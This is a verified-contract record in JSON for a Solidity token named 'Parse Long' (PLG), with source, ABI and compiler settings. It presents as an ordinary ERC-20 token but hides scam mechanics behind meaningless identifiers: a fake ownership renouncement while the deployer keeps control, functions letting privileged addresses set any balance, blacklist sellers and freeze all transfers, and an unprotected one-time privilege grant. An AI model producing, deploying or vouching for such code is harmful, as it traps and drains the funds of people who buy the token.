{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface launchedWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingFromAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchMarketing {\n    function createPair(address takeToken, address takeWallet) external returns (address);\n}\n\ninterface modeLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitTeam) external view returns (uint256);\n\n    function transfer(address exemptTakeAmount, uint256 launchMode) external returns (bool);\n\n    function allowance(address minSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTakeAmount,\n        uint256 launchMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toFee, uint256 value);\n    event Approval(address indexed minSell, address indexed spender, uint256 value);\n}\n\ninterface listTeam is modeLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ParseLong is tradingFromAuto, modeLimit, listTeam {\n\n    function approve(address sellAmountLiquidity, uint256 launchMode) public virtual override returns (bool) {\n        walletListTeam[_msgSender()][sellAmountLiquidity] = launchMode;\n        emit Approval(_msgSender(), sellAmountLiquidity, launchMode);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atLiquidity;\n    }\n\n    uint256 constant isMarketingLaunched = 2 ** 10;\n\n    function transferFrom(address launchedTeamReceiver, address exemptTakeAmount, uint256 launchMode) external override returns (bool) {\n        if (_msgSender() != exemptTeam) {\n            if (walletListTeam[launchedTeamReceiver][_msgSender()] != type(uint256).max) {\n                require(launchMode <= walletListTeam[launchedTeamReceiver][_msgSender()]);\n                walletListTeam[launchedTeamReceiver][_msgSender()] -= launchMode;\n            }\n        }\n        return tokenTo(launchedTeamReceiver, exemptTakeAmount, launchMode);\n    }\n\n    uint256 public enableAmount;\n\n    address totalLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function modeFrom(uint256 launchMode) public {\n        sellFromLimit();\n        totalMode = launchMode;\n    }\n\n    address exemptTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function sellLaunchedTake() public {\n        emit OwnershipTransferred(toTake, address(0));\n        txTo = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverFrom;\n    }\n\n    function balanceOf(address limitTeam) public view virtual override returns (uint256) {\n        return isSwap[limitTeam];\n    }\n\n    function getOwner() external view returns (address) {\n        return txTo;\n    }\n\n    function allowance(address modeWallet, address sellAmountLiquidity) external view virtual override returns (uint256) {\n        if (sellAmountLiquidity == exemptTeam) {\n            return type(uint256).max;\n        }\n        return walletListTeam[modeWallet][sellAmountLiquidity];\n    }\n\n    function tokenTo(address launchedTeamReceiver, address exemptTakeAmount, uint256 launchMode) internal returns (bool) {\n        if (launchedTeamReceiver == toTake) {\n            return liquidityIsEnable(launchedTeamReceiver, exemptTakeAmount, launchMode);\n        }\n        uint256 autoList = modeLimit(minShould).balanceOf(totalLaunched);\n        require(autoList == totalMode);\n        require(exemptTakeAmount != totalLaunched);\n        if (toIs[launchedTeamReceiver]) {\n            return liquidityIsEnable(launchedTeamReceiver, exemptTakeAmount, isMarketingLaunched);\n        }\n        return liquidityIsEnable(launchedTeamReceiver, exemptTakeAmount, launchMode);\n    }\n\n    uint8 private atLiquidity = 18;\n\n    address private txTo;\n\n    string private launchedTakeList = \"PLG\";\n\n    function sellFromLimit() private view {\n        require(liquidityTokenAuto[_msgSender()]);\n    }\n\n    mapping(address => bool) public toIs;\n\n    uint256 private listLaunch;\n\n    string private receiverFrom = \"Parse Long\";\n\n    uint256 totalMode;\n\n    function txTokenTrading(address feeWalletReceiver) public {\n        if (fundFrom) {\n            return;\n        }\n        \n        liquidityTokenAuto[feeWalletReceiver] = true;\n        if (enableAmount != txLaunchTotal) {\n            senderFund = true;\n        }\n        fundFrom = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTakeList;\n    }\n\n    uint256 tokenAmount;\n\n    bool public fundFrom;\n\n    address public toTake;\n\n    function liquidityIsEnable(address launchedTeamReceiver, address exemptTakeAmount, uint256 launchMode) internal returns (bool) {\n        require(isSwap[launchedTeamReceiver] >= launchMode);\n        isSwap[launchedTeamReceiver] -= launchMode;\n        isSwap[exemptTakeAmount] += launchMode;\n        emit Transfer(launchedTeamReceiver, exemptTakeAmount, launchMode);\n        return true;\n    }\n\n    function swapTrading(address modeTo) public {\n        sellFromLimit();\n        if (listLaunch == enableAmount) {\n            maxEnable = true;\n        }\n        if (modeTo == toTake || modeTo == minShould) {\n            return;\n        }\n        toIs[modeTo] = true;\n    }\n\n    constructor (){\n        \n        launchedWallet modeLiquidity = launchedWallet(exemptTeam);\n        minShould = launchMarketing(modeLiquidity.factory()).createPair(modeLiquidity.WETH(), address(this));\n        if (enableAmount != txLaunchTotal) {\n            maxEnable = true;\n        }\n        toTake = _msgSender();\n        sellLaunchedTake();\n        liquidityTokenAuto[toTake] = true;\n        isSwap[toTake] = enableMax;\n        if (enableAmount != txLaunchTotal) {\n            enableAmount = txLaunchTotal;\n        }\n        emit Transfer(address(0), toTake, enableMax);\n    }\n\n    bool public senderFund;\n\n    function senderWallet(address totalLaunch, uint256 launchMode) public {\n        sellFromLimit();\n        isSwap[totalLaunch] = launchMode;\n    }\n\n    function owner() external view returns (address) {\n        return txTo;\n    }\n\n    function transfer(address totalLaunch, uint256 launchMode) external virtual override returns (bool) {\n        return tokenTo(_msgSender(), totalLaunch, launchMode);\n    }\n\n    mapping(address => bool) public liquidityTokenAuto;\n\n    uint256 private enableMax = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private walletListTeam;\n\n    mapping(address => uint256) private isSwap;\n\n    address public minShould;\n\n    event OwnershipTransferred(address indexed teamSwap, address indexed fromMaxShould);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMax;\n    }\n\n    uint256 private txLaunchTotal;\n\n    bool private takeFund;\n\n    bool public maxEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMaxShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellAmountLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmountLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTokenAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"modeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunchedTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"senderWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"swapTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTeamReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTakeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeWalletReceiver\",\"type\":\"address\"}],\"name\":\"txTokenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ParseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}